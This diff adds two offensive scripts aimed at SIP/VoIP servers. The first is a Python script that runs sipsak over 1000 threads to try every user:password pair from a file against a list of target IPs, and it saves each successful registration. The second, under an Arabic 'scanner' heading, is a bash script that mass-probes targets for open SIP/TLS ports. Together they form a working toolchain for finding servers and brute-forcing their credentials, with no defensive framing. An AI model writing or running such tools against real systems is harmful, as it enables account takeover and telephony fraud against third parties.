@@ -1,0 +1,111 @@
+import os
+import subprocess
+import threading
+
+# File containing user:password pairs in the format "user:password"
+user_pass_file = "User_Pass"
+
+# File containing a list of targets (IP addresses and ports)
+ip_file = "ip.txt"
+
+# File to save successful results
+success_results = "success_results.txt"
+
+def register_user(user, password, target):
+    # Execute the sipsak command to register the user based on the user and password and the target
+    cmd = f"sipsak -U -C sip:{user}@home.com --from sip:{user}@{target} -u {user} -a {password} -p {target} -s sip:{user}@{target} -i -vvv -E TLS"
+    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+    # Check the result for a successful 200 OK response
+    if b"200 OK" in result.stdout:
+        # If there is a successful response, register the result in the success_results file
+        with open(success_results, "a") as file:
+            file.write(result.stdout.decode("utf-8"))
+            file.write("\n")  # Add a new line after each successful registration
+    else:
+        # If there is no successful response, print the error
+        print(f"Registration failed for {user} at {target}:\n{result.stderr.decode('utf-8')}")
+
+def register_users_thread(users, targets):
+    for user_pass in users:
+        user, password = user_pass.strip().split(":")
+        for target in targets:
+            target = target.strip()
+            register_user(user, password, target)
+
+def main():
+    # Read user:password pairs from the User_Pass file
+    with open(user_pass_file, "r") as users_file:
+        users = users_file.readlines()
+
+    # Read targets from the ip.txt file
+    with open(ip_file, "r") as targets_file:
+        targets = targets_file.readlines()
+
+    # Create a list of threads
+    threads = []
+    num_threads = 1000
+
+    # Split the list of targets into chunks for each thread
+    targets_chunked = [targets[i:i + len(targets) // num_threads] for i in range(0, len(targets), len(targets) // num_threads)]
+
+    # Start and join threads
+    for i in range(num_threads):
+        thread = threading.Thread(target=register_users_thread, args=(users, targets_chunked[i]))
+        thread.start()
+        threads.append(thread)
+
+    # Wait for all threads to complete
+    for thread in threads:
+        thread.join()
+
+if __name__ == "__main__":
+    main()
+
+
+
+
+==============================  سكانر ===========================================
+
+#!/bin/bash
+
+# File containing list of targets (IP addresses and domains)
+target_file="targets.txt"
+
+# File to save the open TLS ports
+output_file="open_ports.txt"
+
+# List of ports to check for TLS (modify as needed)
+tls_ports=(443 5061 5060)
+
+# Function to check if the TLS port is open for a target
+check_tls_port() {
+  local target=$1
+  local port=$2
+  local result=$(sipsak -vvv --tls-ignore-cert-failure -s "sip:$target:$port" 2>&1)
+  if echo "$result" | grep -q "SIP"; then
+    echo "TLS port $port is open for target $target"
+    echo "TLS port $port is open for target $target" >> "$output_file"
+  fi
+}
+
+# Main script
+if [ ! -f "$target_file" ]; then
+  echo "Error: Targets file not found: $target_file"
+  exit 1
+fi
+
+rm -f "$output_file"
+
+while read -r target || [[ -n "$target" ]]; do
+  target=$(echo "$target" | tr -d '[:space:]')
+  echo "Checking TLS ports for target: $target"
+  for port in "${tls_ports[@]}"; do
+    check_tls_port "$target" "$port" &
+  done
+done < "$target_file"
+
+wait
+echo "Done! Open TLS ports saved in $output_file"
+
+
